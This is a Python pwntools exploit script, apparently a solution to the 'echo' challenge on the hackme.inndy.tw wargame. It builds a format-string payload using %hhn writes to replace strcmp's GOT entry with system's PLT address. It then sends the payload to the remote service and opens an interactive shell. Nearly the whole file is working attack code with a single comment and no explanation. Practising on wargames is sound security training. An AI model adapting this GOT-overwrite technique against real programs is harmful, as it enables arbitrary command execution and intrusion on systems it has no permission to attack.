#!/usr/bin/env python3
from pwn import *

context(arch='x86', terminal=["tmux", "neww"])

system_plt = 0x08048400
strcmp_got = 0x0804a010
base = 7

# Idea: Overwrite plt address of strcmp_got to system_plt

payload = b''
payload += p32(strcmp_got)
payload += p32(strcmp_got+1)
payload += p32(strcmp_got+2)
payload += p32(strcmp_got+3)

offset = 16
for i in range(4):
    target = system_plt & 0xff
    system_plt >>= 8

    print("Target: {}, Offset: {}".format(target, offset))
    print("Offset: {}".format(offset))
    
    payload += '%{}c%{}$hhn'.format((target-offset)%0x100, i+base).encode()
    offset = target

r = remote('hackme.inndy.tw', 7711)
#r = process('./echo')
#gdb.attach(r)
r.sendline(payload)

r.interactive()



